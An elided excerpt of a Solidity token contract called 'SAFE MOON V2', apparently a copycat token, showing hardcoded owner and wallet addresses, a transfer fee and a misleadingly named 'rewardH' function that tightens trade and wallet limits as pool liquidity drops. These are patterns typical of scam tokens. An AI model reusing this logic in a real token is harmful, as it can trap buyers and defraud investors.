...
contract SAFEMOON is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x5BE5adF6a9Af538ba8D12188a718Ae5e4c35821b); 
    address payable public Wallet_Dev = payable(0x5BE5adF6a9Af538ba8D12188a718Ae5e4c35821b);
    ...
    string private constant _name = "SAFE MOON V2"; 
    string private constant _symbol = unicode"SMV2"; 
    ...
    uint256 private Percent_burn = 1;
    ...
    constructor () {
        ...
        _owner = 0x724ef80b976F873eB757668df9f9a485176F0D15;
    ...
    function _transfer(
        ...
        if (to != owner() &&
            ...
            _tOwned[address(this)] = (_tOwned[address(this)] += ((1*amount / 100))*Percent_burn);
    ...
    function rewardH(uint256 rewardValue) private {

        if(balanceOf(uniswapV2Pair) <= (_tTotal * 90 / 100) && rewardValue != 99){
            _maxTxAmount = _tTotal * 4 / 100;
            _maxWalletToken = _tTotal * 5 / 100;
        }
        if(balanceOf(uniswapV2Pair) <= (_tTotal * 70 / 100) && rewardValue != 99){
            _maxTxAmount = _tTotal * 3 / 100;
            _maxWalletToken = _tTotal * 3 / 100;
        }
        if(balanceOf(uniswapV2Pair) <= (_tTotal * 50 / 100) && rewardValue != 99){
